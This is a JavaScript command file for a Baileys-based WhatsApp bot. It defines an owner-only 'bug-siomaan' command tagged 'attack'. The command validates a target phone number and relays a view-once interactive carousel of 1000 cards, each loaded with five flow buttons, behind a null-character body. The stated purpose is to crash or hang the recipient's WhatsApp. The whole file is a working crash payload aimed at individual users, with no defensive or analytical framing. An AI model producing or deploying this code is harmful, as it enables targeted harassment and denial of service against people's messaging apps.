const { cmd } = require('../command');
const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');

cmd({
    pattern: "bug-siomaan",
    alias: ["crash1", "hang1", "bug1"],
    desc: "Sends a heavy carousel message to crash a user's WhatsApp.",
    category: "attack",
    react: "💀",
    filename: __filename
},
async (conn, mek, m, { q, reply }) => {
    try {
        const ownerJid = "923151105391@s.whatsapp.net";
        if (m.sender !== ownerJid) {
            return reply('🚫 *Owner Only Command!*');
        }

        if (!q) {
            return reply("⚠️ *Target Missing!*\nExample: .bug-siomaan +923001234567");
        }

        let targetNumber = q.replace(/[^0-9+]/g, '');
        if (!targetNumber.startsWith('+')) targetNumber = '+' + targetNumber;

        const [check] = await conn.onWhatsApp(targetNumber);
        if (!check?.exists) {
            return reply(`🤔 *${targetNumber}* is not on WhatsApp.`);
        }

        const targetJid = check.jid;
        reply(`⏳ *Sending payload to:* ${targetNumber}`);

        // Buttons
        let buttons = [];
        for (let i = 0; i < 5; i++) {
            buttons.push({
                name: 'galaxy_message',
                buttonParamsJson: JSON.stringify({
                    header: 'null',
                    body: 'xxx',
                    flow_action: 'navigate',
                    flow_action_payload: { screen: 'FORM_SCREEN' },
                    flow_cta: 'Grattler',
                    flow_id: '1169834181134583',
                    flow_message_version: '3',
                    flow_token: 'AQAAAAACS5FpgQ_cAAAAAE0QI3s'
                })
            });
        }

        // Cards
        let carouselCards = [];
        for (let i = 0; i < 1000; i++) {
            carouselCards.push({
                body: { text: '🍀 𝐒𝐀𝐊𝐎𝐍𝐀-𝐌𝐃 𝐂𝐚𝐫𝐨𝐮𝐬𝐞𝐥 ☠️' },
                footer: { text: '𝐒𝐀𝐊𝐎𝐍𝐀-𝐌𝐃 𝐛𝐲 𝐐𝐚𝐝𝐞𝐞𝐫_𝐊𝐡𝐚𝐧' },
                header: {
                    title: '☠️',
                    hasMediaAttachment: true,
                    imageMessage: {}
                },
                nativeFlowMessage: { buttons }
            });
        }

        const finalMessage = generateWAMessageFromContent(targetJid, {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2
                    },
                    interactiveMessage: {
                        body: { text: '\u0000' },
                        footer: { text: '𝐒𝐀𝐊𝐎𝐍𝐀-𝐌𝐃 𝐛𝐲 𝐐𝐚𝐝𝐞𝐞𝐫_𝐊𝐡𝐚𝐧' },
                        header: { hasMediaAttachment: false },
                        carouselMessage: { cards: carouselCards }
                    }
                }
            }
        }, {});

        await conn.relayMessage(targetJid, finalMessage.message, {
            messageId: finalMessage.key.id
        });

        reply(`✅ *Crash sent to:* ${targetNumber}`);

    } catch (e) {
        console.error("Error:", e);
        reply(`❌ Error: ${e.message}`);
    }
});